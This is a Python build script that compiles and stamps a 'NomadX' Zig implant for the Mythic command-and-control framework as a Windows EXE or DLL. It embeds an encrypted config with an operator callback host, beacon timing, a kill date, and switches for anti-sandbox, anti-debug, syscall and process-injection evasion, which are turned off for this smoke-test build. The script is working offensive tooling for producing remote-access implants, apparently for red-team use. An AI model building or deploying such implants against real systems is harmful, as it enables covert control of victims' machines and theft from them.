#!/usr/bin/env python3
"""Build a stamped NomadX Zig payload for a smoke test or Mythic build."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import uuid as uuidlib

_TOOLS_DIR = pathlib.Path(__file__).resolve().parent
if str(_TOOLS_DIR) not in sys.path:
    sys.path.insert(0, str(_TOOLS_DIR))

from gen_config import DEFAULT_USER_AGENT, encrypt_config, normalize_key, parse_kill_date
from pe_fix import fix_pe

ROOT = pathlib.Path(__file__).resolve().parents[1]


def find_zig(explicit: str | None) -> str:
    if explicit:
        return explicit
    env = os.environ.get("NOMADX_ZIG") or os.environ.get("NOMAD_ZIG")
    if env:
        return env
    local = ROOT / ".toolchain" / "current" / "zig"
    if local.exists():
        return str(local)
    found = shutil.which("zig")
    if found:
        return found
    raise SystemExit("Zig not found. Set NOMADX_ZIG/NOMAD_ZIG or add zig to PATH.")


def build_config(args: argparse.Namespace) -> dict:
    return {
        "uuid": args.uuid,
        "aes_key_hex": normalize_key(args.aes_key).hex(),
        "callback_host": args.host,
        "callback_port": args.port,
        "callback_interval": args.interval,
        "callback_jitter": args.jitter,
        "get_uri": args.get_uri,
        "post_uri": args.post_uri,
        "user_agent": args.user_agent,
        "tls_verify": not args.no_tls_verify,
        "proxy_host": args.proxy_host,
        "proxy_port": args.proxy_port,
        "kill_date": parse_kill_date(args.kill_date),
        "debug": args.debug,
        "sleep_mask": "none",
        "alloc_strategy": "memory_hole",
        "sacrificial_process": "",
        "pre_sleep_seconds": 0,
        "injection_step_delay_ms": 0,
        "require_domain_joined": False,
        "enable_anti_sandbox": False,
        "enable_computational_delay": False,
        "enable_anti_emulation": False,
        "enable_anti_debug": False,
        "use_direct_syscalls": False,
        "syscall_mode": "none",
        "default_injection_technique": "none",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True, help="Callback host, e.g. http://192.0.2.10")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--uuid", default=str(uuidlib.uuid4()))
    parser.add_argument("--aes-key", default="", help="Base64 or 64 hex chars; empty = disabled")
    parser.add_argument("--interval", type=int, default=1)
    parser.add_argument("--jitter", type=int, default=0)
    parser.add_argument("--get-uri", default="/api/v1.4/agent_message")
    parser.add_argument("--post-uri", default="/api/v1.4/agent_message")
    parser.add_argument("--user-agent", default=DEFAULT_USER_AGENT)
    parser.add_argument("--proxy-host", default="")
    parser.add_argument("--proxy-port", type=int, default=0)
    parser.add_argument("--kill-date", default="")
    parser.add_argument("--no-tls-verify", action="store_true")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--format", choices=["exe", "dll"], default="exe")
    parser.add_argument("--dllmain-start", action="store_true", help="DLL only: start from DllMain")
    parser.add_argument("--zig", default=None, help="Path to the Zig 0.17.1 compiler")
    parser.add_argument("--output", default=None, help="Output file (default: dist/nomadx_smoke.<ext>)")
    parser.add_argument("--keep-build", action="store_true", help="Keep the temporary build directory")
    args = parser.parse_args()

    zig = find_zig(args.zig)
    config = build_config(args)
    build_dir = pathlib.Path(tempfile.mkdtemp(prefix="nomadx_smoke_build_"))
    try:
        for name in ("build.zig", "build.zig.zon"):
            shutil.copy2(ROOT / name, build_dir / name)
        shutil.copytree(
            ROOT / "src",
            build_dir / "src",
            ignore=shutil.ignore_patterns("agent_config.json", "agent_config.enc"),
        )
        (build_dir / "src" / "agent_config.enc").write_bytes(
            encrypt_config(json.dumps(config, indent=2) + "\n")
        )

        command = [zig, "build", "--release=small"]
        if args.format == "dll" and args.dllmain_start:
            command.append("-Ddllmain_start=true")

        print(f"[*] building with {zig}")
        result = subprocess.run(command, cwd=build_dir, capture_output=True, text=True, timeout=600)
        if result.returncode != 0:
            sys.stderr.write(result.stderr)
            sys.stderr.write(result.stdout)
            return result.returncode

        artifact = build_dir / "zig-out" / "bin" / f"nomadx.{args.format}"
        if not artifact.exists():
            raise SystemExit(f"build did not produce {artifact}")

        if args.output:
            output = pathlib.Path(args.output)
        else:
            output = ROOT / "dist" / f"nomadx_smoke.{args.format}"
        output.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(artifact, output)
        fix_pe(str(output))

        digest = hashlib.sha256(output.read_bytes()).hexdigest()
        print(f"[+] wrote {output} ({output.stat().st_size} bytes)")
        print(f"[+] sha256 {digest}")
        print(f"[+] uuid {config['uuid']}")
        print(f"[+] callback {config['callback_host']}:{config['callback_port']}")
        print(f"[+] encryption {'AES-256-CBC/HMAC' if any(config['aes_key_hex'][i:i+2] != '00' for i in range(0, 64, 2)) else 'disabled (zero key)'}")
        if args.keep_build:
            print(f"[+] build directory {build_dir}")
        return 0
    finally:
        if not args.keep_build:
            shutil.rmtree(build_dir, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
